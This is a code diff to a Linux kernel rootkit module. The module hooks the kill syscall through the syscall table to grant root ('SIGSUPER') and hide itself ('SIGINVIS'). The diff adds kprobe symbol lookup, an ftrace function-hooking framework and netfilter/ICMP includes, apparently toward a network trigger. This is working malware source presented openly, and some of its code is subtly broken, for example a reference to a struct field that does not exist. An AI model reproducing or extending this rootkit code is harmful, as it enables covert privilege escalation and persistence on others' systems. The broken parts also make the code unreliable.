@@ -9,16 +9,33 @@
 #include <linux/kallsyms.h>
 #include <linux/unistd.h>
 #include <linux/dirent.h>
+#include <linux/netfilter_ipv4.h>
+#include <linux/ip.h>
+#include <linux/icmp.h>
+#include <linux/ftrace.h>
 
+#include <linux/list.h>
 
 // Syscall table address pointer
 unsigned long *__sys_call_table_addr;
+static struct nf_hook_ops nfho;
+
+// Structure that represents ftrace hook
+struct ftrace_hook {
+    const char *name;
+    void *original_function;
+    void *modified_function;
+
+    unsigned long address;
+    struct ftrace_ops ops;
+};
 
 enum signals {
     SIGSUPER = 64, // Become root
     SIGINVIS = 63, // Become invisible
 };
 
+LIST_HEAD(hook_list);
 
 // Using kprobes method for getting syscall table address for new versions of kernel
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
@@ -26,7 +43,36 @@ enum signals {
 #include <linux/kprobes.h>
 #define KPROBE_ 1
 
+static unsigned long lookup_name(const char *name)
+{
+    struct kprobe kp = {
+		.symbol_name = name
+	};
+
+    unsigned long ret_value;
+
+    if (register_kprobe(&kp) < 0) return 0;
+
+    ret_value = (unsigned long) kp.addr;
+    unregister_kprobe(&kp);
+
+    return ret_value;
+}
+
+#else
+
+static unsigned long lookup_name(const char *name)
+{
+    return kallsyms_lookup_name(name);
+}
+
+#endif
+
+#ifdef KPROBE_
+
+// Defining kprobe for syscall_table (should be replaced with function above)
 typedef unsigned long (* kallsyms_lookup_name_t)(const char* name);
+
 static struct kprobe kp = {
         .symbol_name = "kallsyms_lookup_name"
 };
@@ -84,25 +130,84 @@ static asmlinkage long hack_kill_syscall(const struct pt_regs* regs)
 
 #endif
 
+// Working with syscalls
 
-static void store(void)
+static void store_kill(void)
 {
     orig_kill = (syscall_wrapper)__sys_call_table_addr[__NR_kill];
 }
 
 
-static void hook(void)
+static void hook_kill(void)
 {
     __sys_call_table_addr[__NR_kill] = (unsigned long)&hack_kill_syscall;
 }
 
 
-static void restore_syscall(void)
+static void restore_kill(void)
 {
     /* Restore syscall table */
     __sys_call_table_addr[__NR_kill] = (unsigned long)orig_kill;
 }
 
+static int save_original_ftraceh(struct ftrace_hook *hook)
+{
+    hook->address = lookup_name(hook->name);
+
+    if (!hook->address) {
+        pr_debug("unresolved symbol: %s\n", hook->name);
+        return -ENOENT;
+    }
+
+    *((unsigned long*) hook->original_function) = hook->address;
+
+    return 0;
+}
+
+static void notrace create_callback(unsigned long ip, unsigned long parent_ip,
+                                    struct ftrace_ops *ops, struct ftrace_regs *fregs)
+{
+    struct pt_regs *regs = ftrace_get_regs(fregs);
+    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
+
+    if (!within_module(parent_ip, THIS_MODULE))
+        regs->ip = (unsigned long)hook->function;
+}
+
+static int register_ftrace_hook(struct ftrace_hook *hook)
+{
+    if (save_original_ftraceh(hook) != 0) return -1;
+
+    hook->ops.func = create_callback;
+    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
+                      | FTRACE_OPS_FL_RECURSION
+                      | FTRACE_OPS_FL_IPMODIFY;
+
+    int err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+
+    if (err) {
+        pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
+        return err;
+    }
+
+    err = register_ftrace_function(&hook->ops);
+    if (err) {
+        pr_debug("register_ftrace_function() failed: %d\n", err);
+        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+        return err;
+    }
+
+    return 0;
+}
+
+void fh_remove_hook(struct ftrace_hook *hook)
+{
+    int err = unregister_ftrace_function(&hook->ops);
+
+    if (err) pr_debug("unregister_ftrace_function() failed: %d\n", err);
+
+    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+}
 
 // Function that launches when module is inserted
 static int __init mod_init(void)
@@ -125,12 +230,13 @@ static int __init mod_init(void)
     unregister_kprobe(&kp);
 
 #endif
-    __sys_call_table_addr = (unsigned long *)kallsyms_lookup_name("sys_call_table");
 
-    store();
+    __sys_call_table_addr = (unsigned long *) kallsyms_lookup_name("sys_call_table");
+
+    store_kill();
     unprotect_memory();
 
-    hook();
+    hook_kill();
     protect_memory();
 
     return 0;
@@ -143,7 +249,7 @@ static void __exit mod_exit(void)
     pr_info("rootkit: exited\n");
 
     unprotect_memory();
-    restore_syscall();
+    restore_kill();
     protect_memory();
 }
 
